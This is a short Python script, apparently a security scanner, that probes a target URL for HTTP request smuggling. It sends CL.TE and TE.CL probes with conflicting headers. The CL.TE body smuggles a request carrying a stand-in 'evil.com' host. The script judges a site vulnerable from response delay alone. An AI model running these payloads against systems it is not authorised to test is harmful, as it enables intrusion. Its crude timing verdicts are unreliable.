#!/usr/bin/env python3
"""HTTP Request Smuggling Validator

Safe timing-based detection with differential response analysis.
"""

import argparse
import json
import os
import time
from typing import Any, Dict, List

import requests


def test_smuggling(target_url: str) -> Dict[str, Any]:
    """Test for HTTP request smuggling vulnerabilities."""
    result = {
        "vulnerable": False,
        "tests": [],
    }
    
    # CL.TE test (Content-Length vs Transfer-Encoding)
    try:
        headers = {
            "Content-Length": "44",
            "Transfer-Encoding": "chunked",
        }
        data = "0\r\n\r\nGET / HTTP/1.1\r\nHost: evil.com\r\n\r\n"
        
        start = time.time()
        resp = requests.post(target_url, headers=headers, data=data, timeout=10)
        elapsed = time.time() - start
        
        result["tests"].append({
            "type": "CL.TE",
            "elapsed": elapsed,
            "status_code": resp.status_code,
            "vulnerable": elapsed > 2.0,  # Suspicious delay
        })
    except Exception as e:
        result["tests"].append({"type": "CL.TE", "error": str(e)})
    
    # TE.CL test
    try:
        headers = {
            "Transfer-Encoding": "chunked",
            "Content-Length": "4",
        }
        data = "0\r\n\r\nX"
        
        start = time.time()
        resp = requests.post(target_url, headers=headers, data=data, timeout=10)
        elapsed = time.time() - start
        
        result["tests"].append({
            "type": "TE.CL",
            "elapsed": elapsed,
            "status_code": resp.status_code,
            "vulnerable": elapsed > 2.0,
        })
    except Exception as e:
        result["tests"].append({"type": "TE.CL", "error": str(e)})
    
    result["vulnerable"] = any(t.get("vulnerable") for t in result["tests"])
    
    return result


def main() -> None:
    ap = argparse.ArgumentParser(description="HTTP Request Smuggling Validator")
    ap.add_argument("--target", required=True, help="Target URL")
    ap.add_argument("--output", help="Output JSON file")
    
    args = ap.parse_args()
    
    result = test_smuggling(args.target)
    
    if args.output:
        out_path = args.output
    else:
        from urllib.parse import urlparse
        parsed = urlparse(args.target)
        host = parsed.netloc.replace(":", "_")
        out_path = f"smuggling_validation_{host}.json"
    
    with open(out_path, "w", encoding="utf-8") as fh:
        json.dump(result, fh, indent=2)
    
    print(out_path)


if __name__ == "__main__":
    main()

